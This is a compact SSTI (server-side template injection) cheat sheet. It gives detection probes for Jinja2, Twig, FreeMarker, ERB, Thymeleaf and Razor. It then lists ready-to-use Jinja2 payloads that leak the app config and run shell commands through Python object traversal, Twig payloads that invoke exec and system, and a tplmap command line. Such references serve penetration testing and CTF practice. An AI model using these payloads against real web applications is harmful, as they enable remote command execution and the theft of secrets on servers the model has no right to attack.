# SSTI Reference

## Detection
```
{{7*7}}          -> 49 (Jinja2, Twig)
${7*7}           -> 49 (FreeMarker, Velocity)
<%= 7*7 %>       -> 49 (ERB)
#{7*7}           -> 49 (Thymeleaf)
*{7*7}           -> 49 (Thymeleaf)
@(7*7)           -> 49 (Razor)
```

## Jinja2 (Python/Flask)
```python
# Config leak
{{config}}
{{config.items()}}

# RCE via subclasses
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}

# Find subprocess.Popen index
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'Popen' %}
{{c('cat flag.txt',shell=True,stdout=-1).communicate()[0]}}
{% endif %}
{% endfor %}

# Compact RCE
{{lipsum.__globals__['os'].popen('cat flag').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

## Twig (PHP)
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

## Automation
```bash
tplmap -u "http://target/page?name=test"
```
